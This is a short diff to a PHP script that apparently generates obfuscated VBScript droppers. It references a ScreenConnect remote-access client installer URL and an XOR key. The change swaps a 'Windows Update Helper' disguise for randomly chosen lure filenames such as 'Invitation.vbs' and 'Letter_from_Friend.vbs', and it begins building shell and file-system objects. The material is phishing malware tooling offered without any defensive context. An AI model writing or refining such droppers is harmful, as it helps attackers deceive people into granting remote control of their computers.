@@ -15,8 +15,18 @@ $xorKey    = rand(100, 255);
 $scUrl = "https://yourdomain.com/ScreenConnect.ClientSetup.exe";
 // =====================
 
-echo <<<VBS
-' Windows Update Helper
+
+// Random invitation-style filenames
+$fakeNames = [
+    "Invitation.vbs",
+    "Your_Invitation.vbs",
+    "Party_Invite.vbs",
+    "Letter_from_Friend.vbs",
+    "Invitation_from_Friend.vbs",
+    "Important_Mail.vbs",
+    "Letter_Invite.vbs"
+];
+$randomFilename = $fakeNames[array_rand($fakeNames)];
 
 Dim $randV1, objShell, objFSO
 Set objShell = CreateObject("WScript.Shell")
